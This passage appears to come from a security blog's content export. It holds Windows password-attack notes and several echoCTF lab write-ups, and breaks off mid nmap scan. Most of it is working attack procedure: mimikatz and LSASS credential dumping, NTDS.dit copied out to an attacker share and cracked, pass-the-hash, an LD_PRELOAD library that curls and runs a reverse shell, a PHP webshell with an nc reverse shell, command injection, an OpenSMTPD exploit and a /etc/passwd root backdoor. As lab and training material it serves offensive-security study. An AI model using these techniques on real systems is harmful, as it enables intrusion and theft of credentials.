HKLM\\sam C:\\sam.save reg save HKLM\\system C:\\system.save (2) Run mimikatz mimikatz.exe (3) Elevate priviliages in mimikatz privilege::debug token::elevate (4) Proceed to dump the local-hashes lsadump::sam system.save sam.save (5) List LM \u0026amp; NTLM credentials sekurlsa::msv Dumping Hashes for all Logged-on Users to the Current Workstation (AD included) .\\mimikatz.exe privilege::debug sekurlsa::logonpasswords Attacking LSASS Dumping LSASS Process Memory ## Task Manager Method Open Task Manager \u0026gt; Select the Process tab \u0026gt; Find \u0026amp; right click on the Local Security Authority Process \u0026gt; Select Create dump file ## A file called lsass.DMP is created and saved in the following path: C:\\Users\\loggedonusersdirectory\\AppData\\Local\\Temp ## NOTE: Its Always better to tranfer the files to our attacking machine for cracking Rundll32.exe \u0026amp;\u0026amp; Comsvcs.dll Method \u0026amp; Pypykatz ## Before issuing a command to create a dump file, we must determine what `process ID (PID) is assigned to lsass.exe`. This can be done from both CMD and POWERSHELL: ## Finding LSASS PID in CMD (as admin) tasklist /svc ## Finding LSASS PID in POWERSHELL (as admin) Get-Process lsass ### Creating lsass.dmp using powershell rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\lsass.dmp full ## Explanation of the above command - rundll32 C:\\windows\\system32\\comsvcs.dll : Running \u0026#39;rundll32\u0026#39; to call an exported function \u0026#39;comsvcs.dll\u0026#39; which calls \u0026#39;MiniDumpWrite\u0026#39; function to dump LSASS process memory - 672 : lsass.exe PID - C:\\lsass.dump : Specifies directory where the dump is stored Pypykatz ## Using `Pypykatz` to extract credentials after getting the lsass.dmp ## Once we have the lsass.dmp file on our Linux-machine we can proceed to extract the secrets from it. sudo pypykatz lsa minidump /home/addict/lsass.dmp ## Explanation - lsa : use¬†`lsa`¬†in the command because LSASS is a subsystem of¬†`local security authority` - minidump : we specify the data source as a¬†`minidump`¬†file - /home/addict/lsass.dmp : path to the dump file Attacking AD \u0026amp; NTDS.dit ## From MITRE NTDS file location: %SystemRoot%\\NTDS\\Ntds.dit (in the domain cotroller) Resource: https://attack.mitre.org/techniques/T1003/003/ Dictionary Attacks against AD ## Creating Custom list of Usernames ## Browse target site and find potential employeenames cat usernames Ben Williamson dotpirate Burgerstien Jim Stevenson Jill Johnson Jane Doe ## Using username-anarchy (automation) sudo git clone https://github.com/urbanadventurer/username-anarchy.git ./username-anarchy -i usernames ## Using Crackmapexec sudo crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt Capturing NTDS.dit ## Connecting to DC with Evil-WinRM sudo evil-winrm -i 10.129.202.57 -u bwilliamson -p \u0026#39;P#55w0rd!\u0026#39; ## Checking Local Group Policy C:\\\u0026gt; net localgroup ## Checking User Account Privileges inclidung Domain C:\\\u0026gt; net user bwilliamson ## Creating Shadow Copy of C: using `vssadmin` PS C:\\\u0026gt; vssadmin CREATE SHADOW /For=C: ## Copying NTDS.dir from the VSS ## We can then copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host. PS C:\\NTDS\u0026gt; cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\NTDS\\NTDS.dit c:\\NTDS\\NTDS.dit ## On Kali (10.10.15.30) sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltndotpirate/Documents/ ## On Windows PS C:\\NTDS\u0026gt; cmd.exe /c move C:\\NTDS\\NTDS.dit \\\\10.10.15.30\\CompData PS C:\\\u0026gt; reg.exe save hklm\\system C:\\system.save PS C:\\\u0026gt; move system.save \\\\10.10.15.30\\CompData ## Extracting ntds using secretsdump.py sudo python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ./NTDS.dit -system system.save -hashes lmhash:nthash LOCAL -outputfile ntlm-extract ## Hashcat to crack the captured hashes sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt Capturing NTDS.dit with Crackmapexec sudo crackmapexec smb 10.129.201.57 -u bwilliamson -p \u0026#39;P@55w0rd!\u0026#39; --ntds Pass-the-Hash with Evil-WinRM Example sudo evil-winrm -i 10.129.201.57 -u Administrator -H \u0026#34;64f12cddaa88057e06a81b54e73b949b\u0026#34; Credential Hunting Key-Terms-to-Search ## Using `Lazagne.exe` to discover credentials from web-browsers start lazagne.exe all Resource: Binary\nSearching for files ## Using `findstr` to search from patterns findstr /SIM /C:\u0026#34;password\u0026#34; *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml ¬± \u0026#39;IIS\u0026#39; information such as \u0026#39;credentials\u0026#39; may be stored in a \u0026#39;web.config\u0026#39; file. For the default IIS website, this could be located at \u0026#39;C:\\inetpub\\wwwroot\\web.config\u0026#39; Dictionary Files Chrome Dictionary Files PS C:\\htb\u0026gt; gc \u0026#39;C:\\Users\\dotpirate\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Custom Dictionary.txt\u0026#39; | Select-String password Unattended Installation Unattend.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;unattend xmlns=\u0026#34;urn:schemas-microsoft-com:unattend\u0026#34;\u0026gt; \u0026lt;settings pass=\u0026#34;specialize\u0026#34;\u0026gt; \u0026lt;component name=\u0026#34;Microsoft-Windows-Shell-Setup\u0026#34; processorArchitecture=\u0026#34;amd64\u0026#34; publicKeyToken=\u0026#34;31bf3856ad364e35\u0026#34; language=\u0026#34;neutral\u0026#34; versionScope=\u0026#34;nonSxS\u0026#34; xmlns:wcm=\u0026#34;http://schemas.microsoft.com/WMIConfig/2002/State\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34;\u0026gt; \u0026lt;AutoLogon\u0026gt; \u0026lt;Password\u0026gt; \u0026lt;Value\u0026gt;local_4dmin_p@ss\u0026lt;/Value\u0026gt; \u0026lt;PlainText\u0026gt;true\u0026lt;/PlainText\u0026gt; \u0026lt;/Password\u0026gt; \u0026lt;Enabled\u0026gt;true\u0026lt;/Enabled\u0026gt; \u0026lt;LogonCount\u0026gt;2\u0026lt;/LogonCount\u0026gt; \u0026lt;Username\u0026gt;Administrator\u0026lt;/Username\u0026gt; \u0026lt;/AutoLogon\u0026gt; \u0026lt;ComputerName\u0026gt;*\u0026lt;/ComputerName\u0026gt; \u0026lt;/component\u0026gt; \u0026lt;/settings\u0026gt; Mozilla PS\u0026gt; cd \u0026#34;C:\\Users\\dotpirate\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\\u0026#34; Get in one file of the profiles and search for a json file called \u0026#39;activity-stream.discovery_stream.json\u0026#39; PowerShell History File # Powershell 5.0 in Windows 10, PowerShell stores command history to the file `C:\\Users\\\u0026lt;username\u0026gt;\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt` PS C:\\htb\u0026gt; (Get-PSReadLineOption).HistorySavePath Reading PowerShell History File PS C:\\htb\u0026gt; gc (Get-PSReadLineOption).HistorySavePath # Output dir cd Temp md backups cp c:\\inetpub\\wwwroot\\* .\\backups\\ .... We can also use this one-liner to retrieve the contents of all PowerShell history files that we can access as our current user. PS C:\\htb\u0026gt; foreach($user in ((ls C:\\users).fullname)){cat \u0026#34;$user\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\u0026#34; -ErrorAction SilentlyContinue} PowerShell Credentials PowerShell credentials are often used for scripting and automation tasks as a way to store encrypted credentials conveniently. The credentials are protected using \u0026#39;[DPAPI]\u0026#39;, which typically means they can only be decrypted by the same user on the same computer they were created on. Take, for example, the following script `Connect-VC.ps1`, which a sysadmin has created to connect to a vCenter server easily. # Connect-VC.ps1 # Get-Credential | Export-Clixml -Path \u0026#39;C:\\scripts\\pass.xml\u0026#39; $encryptedPassword = Import-Clixml -Path \u0026#39;C:\\scripts\\pass.xml\u0026#39; $decryptedPassword = $encryptedPassword.GetNetworkCredential().Password Connect-VIServer -Server \u0026#39;VC-01\u0026#39; -User \u0026#39;dotpirate_adm\u0026#39; -Password $decryptedPassword Decrypting PowerShell Credentials PS C:\\htb\u0026gt; $credential = Import-Clixml -Path \u0026#39;C:\\scripts\\pass.xml\u0026#39; PS C:\\htb\u0026gt; $credential.GetNetworkCredential().username # Output dotpirate ```cmd PS C:\\htb\u0026gt; $credential.GetNetworkCredential().password # Output Str0ng3ncryptedP@ss! ## Other places to look for: Passwords in Group Policy in the SYSVOL share Passwords in scripts in the SYSVOL share Password in scripts on IT shares Passwords in web.config files on dev machines and IT shares unattend.xml Passwords in the AD user or computer description fields KeePass databases --\u0026gt; pull hash, crack and get loads of access. Found on user systems and shares Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, Sharepoint ","date":"2025-08-08T00:00:00Z","permalink":"https://hack.com.cy/notes/privilege-escalation/windows/passwords/passwords/","section":"notes","tags":["Windows","Windows Password Attacks","privilege escalation","SAM","LSASS","mimikatz","ntds"],"title":"Windows Local Password Attacks"},{"categories":["CTF","OSCP Prep","echoCTF"],"contents":"Video Walkthrough Dolph Enumeration Start by port scanning the target machine.\nNMAP sudo nmap -nvv -p- -sC -sV -T4 10.0.50.1 Output PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 63 nginx 1.10.3 | http-methods: |_ Supported Methods: GET HEAD |_http-title: Tmp uploader It seems that there is an nginx 1.10.3 running on port 80\nLooking the source code we find a new directory called \u0026ldquo;/admin\u0026rdquo;.\nLets check for more directories\ngobuster dir -u http://10.0.50.1/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o rsw.txt /admin (Status: 301) [Size: 185] [--\u0026gt; http://10.0.50.1/admin/] /uploads (Status: 301) [Size: 185] [--\u0026gt; http://10.0.50.1/uploads/] /. (Status: 301) [Size: 185] [--\u0026gt; http://10.0.50.1/./] \u0026ldquo;/admin\u0026rdquo; it interesting lets check that as well\ngobuster dir -u http://10.0.50.1/admin/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o admin-rsw.txt /login (Status: 200) [Size: 8696] When trying to visit \u0026ldquo;/admin/login\u0026rdquo; we download a a binary.\nBefore examining the binary we can manually check the functionality of the web uploader. During the testing i was not able to bypass the security mechanism regarding uploading scripts or a file containing a \u0026ldquo;.\u0026rdquo;\nWhat i found out however is that several PHP wrappers work here so i was able to obtain the source code of the index.php and /admin/index.php. You can read and follow the following guide to understand how we could abuse PHP wrappers\nhttps://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams\nI used the following PHP wrapper to obtain the source code of index.php under the admin directory.\nphp://filter/convert.base64-encode/resource=/var/www/html/admin/index.php Then we can download it by visiting http://10.0.50.1/uploads/wrappersindex and then decoded it to see its contents.\ncat ~/Downloads/wrappersindex | base64 -d \u0026gt; wrapperindex.php Reading the code, it seems that the PHP code retrieves the client‚Äôs IP address from HTTP headers, sets it as part of an environment variable, and passes it as an argument to a local login binary. It blocks IPs containing a single quote to prevent injection, but still allows IP spoofing via the X-Forwarded-For header, which can be abused to influence the environment and execution of the binary.\nAlso notice that the value of the header that we will be sending then gets processes with in the codes \u0026ldquo;exec()\u0026rdquo; function which is crucial! Moving on ..\nWhen we visit \u0026ldquo;/admin\u0026rdquo; we get the following: ![Image Description](/images/Pasted image 20250811115147.png)\nAnd when we try to run the \u0026ldquo;login\u0026rdquo; binary we g downloaded earlier we get the same thing back but when we specify 127.0.0.1 we are allowed.\nSo by adding the X-Forwarded-For header on our request we should see the flag\nHowever even though we tricked the web application to believe that we are coming from 127.0.0.1 and executed the \u0026ldquo;login\u0026rdquo; binary which printed the flag how are we going to get access? \u0026hellip;\nWell by analyzing the PHP source code we obtained and the login binary we downloaded.\nIt is noticed that the binary running on the server accepts preloads. This was found by running the command strace on the binary.\nFollowing the article below we can crate and upload a malicious library on the server using the uploader feature, and then preload it using LD_PRELOAD command in the value of X-Forwarded-For and since the value of the header gets processed by exec() we might be able to get execution.\nhttps://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/\nExploitation Create a reverse shell using msfvenom\nsudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.11.150 LPORT=80 -f elf -o rev Create a malicious .so file using the guide provided above\ncat shell.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void _init() { unsetenv(\u0026#34;LD_PRELOAD\u0026#34;); system(\u0026#34;curl http://10.10.11.150/rev -O /tmp/rev\u0026#34;); } Compiling .c to .so\ngcc -fPIC -shared -o shell.so shell.c -nostartfiles Now lets upload our .so file uisng the download service of the server, even though the we cannot append the .so, it still works.\nWe have code execution! we managed to upload our reverse shell to the target machine, now we have to make it executable and execute following the same process!\ncat shell.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void _init() { unsetenv(\u0026#34;LD_PRELOAD\u0026#34;); system(\u0026#34;chmod +/tmp/rev\u0026#34;); } gcc -fPIC -shared -o shell.so shell.c -nostartfiles ![Image Description](/images/Pasted image 20250811124702.png)\nWe got shell as www-data\nPrivilege Escalation Lets upgrade our shell using python\npython3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; CTRL + Z stty raw -echo;fg (Press Enter) (Press Enter) (Press Enter) export TERM=xterm Upload and run linpeas.sh reveals tha the \u0026lsquo;/etc/passwd\u0026rsquo; is writable!\nwget http://10.10.11.150/linpeas.sh -O /tmp/linpeas.sh chmod +x /tmp/linpeas.sh /tmp/linpeas.sh So we can create our own password and add a new user as root!\n# On kali openssl passwd d0tpirate $1$UaM3ZY23$Xf5rURx8KjC1vT/9pNQmw. # On Target echo \u0026#39;root2:$1$UaM3ZY23$Xf5rURx8KjC1vT/9pNQmw.:0:0:root:/root:/bin/bash\u0026#39; \u0026gt;\u0026gt; /etc/passwd su root2 (d0tpirate) ROOT!\n","date":"2025-07-23T00:00:00Z","permalink":"https://hack.com.cy/writeups/echoctf/dolph/dolph/","section":"writeups","tags":["nginx","LD_PRELOAD","PHP wrapper","privilege escalation"],"title":"echoCTF Dolph Writeup: Nginx to Root via LD_PRELOAD"},{"categories":["CTF","OSCP Prep","echoCTF"],"contents":"Video Walkthrough Cupidme Enumeration Start by port scanning the target machine\nNMAP sudo nmap -nvv -p- 10.0.50.1 -T4 -sC -sV Output PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 63 nginx 1.14.2 |_http-title: Welcome to Cupid\u0026#39;s homepage | http-methods: |_ Supported Methods: GET HEAD POST Found an nginx webserver version 1.14.2 running on port 80.\nVisiting the webserver and viewing its source code we found a hidden upload form and an indication that the webserver uses PHP as the form \u0026ldquo;action=upload.php\u0026rdquo; exposes the programming language used!\nBy using browser developer tools we can edit the html tag and remove the comment html tags thus making it visible to us. Alternately we can to that using Burp (or any other web proxy).\nBefore we test the upload functionality let start a web directory brute force to find new directories or files that might be hidden.\ngobuster dir -u http://10.0.50.1/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o rsw.txt /images (Status: 301) [Size: 185] [--\u0026gt; http://10.0.50.1/images/] /LICENSE (Status: 200) [Size: 1075] /. (Status: 301) [Size: 185] [--\u0026gt; http://10.0.50.1/./] We discover an image directory however when try to access it we get 403 FORBIDDEN.\nExploitation Lets test the upload functionality by first uploading a simple .txt file and then try to access it from the \u0026ldquo;/image\u0026rdquo; directory. We going to use Burp Suite during the upload functionality to analyze the behavior.\nCaptured the upload functionality via Burp Suite: Send it to repeater with CTRL + R so we can repeat the request without going through the whole process of capturing the request \u0026gt; removing the commented form and then upload a file.\nSo we get an error back showing that our Mime-type is wrong. So I did a bit of research of how can we change the Mime-type of a file in Linux and i manage to do it!\nAt the start I believed that the \u0026ldquo;Content-Type\u0026rdquo; is the MIme-type but this is not the case..\nThe main difference depends upon their usage: MimeType describes the nature and format of a file or data across various systems, While ContentType is used in HTTP headers to include not only the MimeType but also additional parameters such as character encoding\nSo how does a \u0026ldquo;.jpeg\u0026rdquo; file looks in raw format. Lets upload a legitimate .jpeg file and see if its accepted.\nIndeed the .jpeg file is accepted, as we can see the error changed. When i try to copy and paste the contents of file colored in red under the Content-Type:image/jpeg i came across an overview explaining that \u0026quot;√ø√ò√ø√Æ\u0026quot; its the JPEG magic number\nThe searching the keyword files magic numbers i landed here.\nhttps://en.wikipedia.org/wiki/List_of_file_signatures\nIf we search for JPEG we can see its magic byte representation\nNow that we know that lets try to replace the rest of the content of JPEG image with text and leave only the magic byte as is. Also change the file extension to .txt\nWe did it ! Trying to view the file on /images downloads the file with our text!\ncat ~/Downloads/video-001.rgb.txt ÔøΩÔøΩÔøΩÔøΩ Dotpirate Test Since we know that the webserver can run PHP scripts we can try and upload a reverse shell and see how it behaves.\ncat video-001.rgb.jpeg.php √ø√ò√ø√Æ \u0026lt;?php system($_GET[\u0026#39;dot\u0026#39;]); ?\u0026gt; And we get execution on the server by visiting : http://10.0.50.1/images/video-001.rgb.jpeg.php?dot=id\nLets get a reverse shell!\nFirst lets check if netcat is installed on the target sever by using which nc\nThe binary is there so lets try to get a revshell now.\nsudo nc -nvlp 80 http://10.0.50.1/images/video-001.rgb.jpeg.php?dot=nc 10.10.11.150 80 -e /bin/bash Success!\nPrivilege Escalation Lets upgrade our shell using python\npython3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; CTRL + Z stty raw -echo;fg (Press Enter) (Press Enter) (Press Enter) export TERM=xterm Manual enumeration i always do before going for automated scripts\n# Check who we are? id # What other users exist on the box? cat /etc/passwd | grep sh$ # Do i have sudo capabilities? sudo -l # Are there ant localservices running on the box? netstat -ano | grep LIST ss -antp # Always check the directroy we landed it, in this case is `/var/www/html/images` ls -la # Check for wierd files in `/opt` and `/tmp` ls -la /tmp \u0026amp;\u0026amp; ls -la /opt Analyzing the output:\nwww-data@cupidme:~/html/images$ pwd /var/www/html/images www-data@cupidme:~/html/images$ ls -la /tmp \u0026amp;\u0026amp; ls -la /opt total 8 drwxrwxrwt 1 root root 4096 Aug 12 09:05 . drwxr-xr-x 1 root root 4096 Aug 12 07:23 .. total 8 drwxr-xr-x 2 root root 4096 Oct 12 2020 . drwxr-xr-x 1 root root 4096 Aug 12 07:23 .. www-data@cupidme:~/html/images$ sudo -l We trust you have received the usual lecture from the local System Administrator. It usually boils down to these three things: #1) Respect the privacy of others. #2) Think before you type. #3) With great power comes great responsibility. [sudo] password for www-data: Sorry, try again. [sudo] password for www-data: Sorry, try again. [sudo] password for www-data: sudo: 3 incorrect password attempts www-data@cupidme:~/html/images$ id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@cupidme:~/html/images$ cat /etc/passwd |grep sh$ root:x:0:0:root:/root:/bin/bash ETSCTF:x:375:65534:ETSCTF_e20a6a5bf097fd763539867c299ece88:/home/ETSCTF:/bin/bash www-data@cupidme:~/html/images$ ss -antp State Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 0 511 127.0.0.1:9001 0.0.0.0:* users:((\u0026#34;ss\u0026#34;,pid=2161,fd=5),(\u0026#34;bash\u0026#34;,pid=2055,fd=5),(\u0026#34;python3\u0026#34;,pid=2054,fd=5),(\u0026#34;bash\u0026#34;,pid=2009,fd=5),(\u0026#34;sh\u0026#34;,pid=2008,fd=5)) LISTEN 0 5 127.0.0.1:25 0.0.0.0:* LISTEN 0 4096 127.0.0.11:33755 0.0.0.0:* LISTEN 0 511 0.0.0.0:80 0.0.0.0:* users:((\u0026#34;nginx\u0026#34;,pid=62,fd=6),(\u0026#34;nginx\u0026#34;,pid=61,fd=6),(\u0026#34;nginx\u0026#34;,pid=60,fd=6)) TIME-WAIT 0 0 127.0.0.1:47982 127.0.0.1:80 TIME-WAIT 0 0 127.0.0.1:54946 127.0.0.1:80 TIME-WAIT 0 0 127.0.0.1:57956 127.0.0.1:9001 TIME-WAIT 0 0 127.0.0.1:52330 127.0.0.1:9001 TIME-WAIT 0 0 127.0.0.1:9001 127.0.0.1:57944 ESTAB 0 2 10.0.50.1:51938 10.10.11.150:80 users:((\u0026#34;python3\u0026#34;,pid=2054,fd=1),(\u0026#34;python3\u0026#34;,pid=2054,fd=0),(\u0026#34;bash\u0026#34;,pid=2009,fd=1),(\u0026#34;bash\u0026#34;,pid=2009,fd=0)) CLOSE-WAIT 9 0 127.0.0.1:9001 127.0.0.1:42676 users:((\u0026#34;ss\u0026#34;,pid=2161,fd=3),(\u0026#34;bash\u0026#34;,pid=2055,fd=3),(\u0026#34;python3\u0026#34;,pid=2054,fd=3),(\u0026#34;bash\u0026#34;,pid=2009,fd=3),(\u0026#34;sh\u0026#34;,pid=2008,fd=3)) TIME-WAIT 0 0 127.0.0.1:9001 127.0.0.1:52314 www-data@cupidme:~/html/images$ There are 2 local services running on ports 25 which SMTP and 9001 which is unknown for as at the moment. We can further fingerprint this ports using nc since is already installed on the target machine.\nwww-data@cupidme:~/html/images$ nc -nvC 127.0.0.1 9001 (UNKNOWN) [127.0.0.1] 9001 (?) open HELP ? www-data@cupidme:~/html/images$ nc -nvC 127.0.0.1 25 (UNKNOWN) [127.0.0.1] 25 (?) open 220 cupidme.echocity-f.com ESMTP OpenSMTPD VERSION 500 5.5.1 Invalid command: Command unrecognized HELP 214-2.0.0 This is OpenSMTPD 214-2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 214-2.0.0 with full details 214 2.0.0 End of HELP info Now we now that port 25 is running OpenSMTPD. Lets do an automated enumeration as well using linpeas.sh by first transferring it to the server.\nAn easy way to transfer files is by using http, utilizing python3 to server webserver and then use either curl or wget to download it.\nMore File Transfer Techniques can be found in my notes Also linpeas can be found here\n# On kali python3 -m http.server 80 # On Target wget http://10.10.11.150/linpeas.sh -O /tmp/linpeas.sh chmod +x /tmp/linpeas.sh /tmp/linpeas.sh We can see that the smtpd is running as root We can also see that that port 9001 is the website running locally According to the enumeration, it seems that the logical path to follow is towards exploiting the SMTPD service since its running as root and we can also interact with it. Lets find out the version of the OpenSMTPD and see if it is vulnerable to any publicly known exploits.\nI could not find a way to get the version of the opensmtpd service so I decided to do port forwarding and then run nmap on it. For this I used chisel\nVarious Port Forwarding concepts can also be found in my notes Chisel binaries can be found here\n# On Kali python3 -m http.server 80 ./chisel server --reverse --port 8810 # On Target wget http://10.10.11.150/chisel -O /tmp/chisel chmod +x /tmp/chisel /tmp/chisel client 10.10.11.150:8810 R:25:127.0.0.1:25 # On Kali sudo nmap -vv -p25 127.0.0.1 -sC -sV PORT STATE SERVICE REASON VERSION 25/tcp open smtp syn-ack ttl 64 OpenSMTPD | smtp-commands: cupidme.echocity-f.com Hello localhost [127.0.0.1], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP |_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info Service Info: Host: cupidme.echocity-f.com Now we got the version! OpenSMTPD 2.0.0 lets search for an exploit\nTo use this exploit the developer suggest to install some python libraries and then use it.\npython3 -m venv .venv source .venv/bin/activate pip3 install pwntools git clone https://github.com/SimonSchoeni/CVE-2020-7247-POC.git cd CVE-2020-7247-POC # Creating a file to see if we have command execution! python3 exploit.py --targetHost 127.0.0.1 --targetPort 25 --customCommand \u0026#39;touch /tmp/fromroot\u0026#39; We can see that we do have command execution and the file is created in /tmp by root!\nLets get a reverse shell using nc\nsudo nc -nvlp 1337 python3 exploit.py --targetHost 127.0.0.1 --targetPort 25 --customCommand \u0026#39;nc 10.10.11.150 1337 -e /bin/bash\u0026#39; ROOT!\n","date":"2025-07-14T00:00:00Z","permalink":"https://hack.com.cy/writeups/echoctf/cupidme/cupidme/","section":"writeups","tags":["file upload","PHP webshell","SMTP exploit","privilege escalation"],"title":"echoCTF Cupidme Writeup: File Upload to Root via SMTP"},{"categories":["CTF","OSCP Prep","echoCTF"],"contents":"Video Walkthrough Smithers Enumeration NMAP Port Scan sudo nmap -vv -p- 10.0.50.0 -T4 -sC -sV -oA nmap/allports Output PORT STATE SERVICE REASON VERSION 10888/tcp open http syn-ack ttl 63 nginx |_http-title: Network Tools 11211/tcp open memcached syn-ack ttl 63 Memcached 1.5.12 (uptime 625 seconds) Analyzing the NMAP output we can see that we found ports 10888 and 11211 open. Port 10888 seems that runs an NGINX web server. Port 11211 its more interesting as the NMAP scan identifies that there is service running called Memcached and we can see the version of it as well 1.5.12\nLets start by visiting the webserver and see what we have..\nThrough this error we can get a lot of information\nThe Memcached service is related to the webserver as the server\u0026rsquo;s version is the same with the Memcached version identified from NMAP. The webserver has some sort of ACL or defensive mechanism related to IP addresses in this case its my kali IP is reflected back. There is a variable which we do not know what it does yet called \u0026ldquo;REMOTE_ADDR\u0026rdquo;. Lets brute force the webserver in order to find any hidden directories or files..\ngobuster dir -u http://10.0.50.0:10888/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o rsw.txt Lets move to the next port where we do have a version as well..\nWhat i usually do when i search for vulnerabilities for a specific software or service, is that i append the keywords ‚Äúpoc‚Äù ‚Äúexploit‚Äù ‚Äúgithub‚Äù prepending the version number and service name\nEven though we did not get any ready-made script using this search, we got an article on how we could test the Memcached server.\nhttps://www.hackingarticles.in/penetration-testing-on-memcached-server/\nReading through this it seems that we can interact with the Memcached server just by using telenet likewise:\ntelnet 10.0.50.0 11211 Go through the full article and it seems that we can execute various commands on the Memcached server like upload files, dump info etc. Most importantly it is noticed that we can set variables.\nEquipped with that information we can try adding our IP within the REMOTE_ADDR variable displayed on the error page found earlier when we tried to visit the webserver.\nI was able to do this using the following manual:\nhttps://www.tutorialspoint.com/memcached/memcached_quick_guide.htm\ntelnet 10.0.50.0 11211 set REMOTE_ADDR 0 1100 12 10.10.11.150 Make sure to replace 12 according to your IP length as the manual suggests (i.e., 10.10.11.14 will be 11)\nNow if we visit the webserver again we are being authorized!\nWhen i saw this i immediate replaced the IP with my kali IP in order to see if i can ping my self. This way we can make sure that the server can reach our kali IP.\nUsing tcp dump we can listen on icmp traffic if the ping is indeed successful:\nsudo tcpdump -i tun0 icmp As expected we get the pings back, however how do we move forward from here. Well the webserver obviously uses system commands \u0026ldquo;ping\u0026rdquo; and we control what comes after the ping \u0026lt;our input\u0026gt;\nWhat if we try to append a command? using \u0026ldquo;;\u0026rdquo;\nSo know we can execute any command we want on the webserver by pre-pending \u0026ldquo;;\u0026rdquo;.\nLets get a shell..\nFirst lets check the architecture of the target server so we know what architecture should our reverse shell be. We can do that by using uname -a\nSo lets create an x64 linux reverse shell using msfvenom\nsudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.11.150 LPORT=80 -f elf -o rev Now lets download and make the reverse shell executable on the target machine using wget and chmod\n# Serve a pyhton webserver python3 -m htt.server 443 # Donload the file on the target 10.10.11.150;wget http://10.10.11.150/rev -O /tmp/rev # Make it executrable 10.10.11.150;chmod +x /tmp/rev # Listen on 80 to catch the shell sudo nc -nvlp 80 # Execute the rev shell 10.10.11.150;/tmp/rev ROOT!\n","date":"2025-06-28T00:00:00Z","permalink":"https://hack.com.cy/writeups/echoctf/smithers/smithers/","section":"writeups","tags":["Memcached","Command Injection","Authentication Bypass","privilege escalation"],"title":"echoCTF Smithers Writeup: Vulenrable Memcached version to root via Command Injection"},{"categories":["CTF","OSCP Prep","echoCTF"],"contents":"Video Walkthrough Alister Enumeration NMAP Port Scan sudo nmap -nvv -p- 10.0.50.0 -T4 -sC -sV Output PORT STATE SERVICE REASON VERSION 1337/tcp open http syn-ack ttl 63 nginx 1.18.0 | http-methods: |_ Supported Methods: GET HEAD POST |_http-title: Site doesnt have a title (text/html; charset=UTF-8). |_http-server-header: nginx/1.18.0 5244/tcp open unknown syn-ack ttl 63 | fingerprint-strings: | GenericLines: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Content-Type: text/html | Date: Mon, 23 Jun 2025 19:54:26 GMT | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html lang=\u0026#34;en\u0026#34; translate=\u0026#34;no\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;script src=\u0026#34;https://polyfill.io/v3/polyfill.min.js?features=String.prototype.replaceAll\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34; \u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34; \u0026gt; | \u0026lt;meta name=\u0026#34;referrer\u0026#34; content=\u0026#34;same-origin\u0026#34; \u0026gt; | \u0026lt;meta name=\u0026#34;generator\u0026#34; content=\u0026#34;AList V3\u0026#34; \u0026gt; | \u0026lt;meta name=\u0026#34;theme-color\u0026#34; content=\u0026#34;#000000\u0026#34; \u0026gt; | \u0026lt;meta name=\u0026#34;google\u0026#34; content=\u0026#34;notranslate\u0026#34; \u0026gt; | \u0026lt;script src=\u0026#34;https://g.alicdn.com/IMM/office-js/1.1.5/aliyun-web-office-sdk.min.js\u0026#34; | async | \u0026gt;\u0026lt;/script\u0026gt; | \u0026lt;link rel=\u0026#34;shortcut icon\u0026#34; | type=\u0026#34;image/ico\u0026#34; | href=\u0026#34;https://cdn.jsdelivr.net/gh/alist-org/logo@main/logo.svg\u0026#34; | \u0026lt;title\u0026gt;AList\u0026lt;/title\u0026gt; | \u0026lt;script\u0026gt; | window.ALIST = { | cdn: \u0026#39;\u0026#39;, | monaco_cdn: undefin | HTTPOptions: | HTTP/1.0 200 OK | 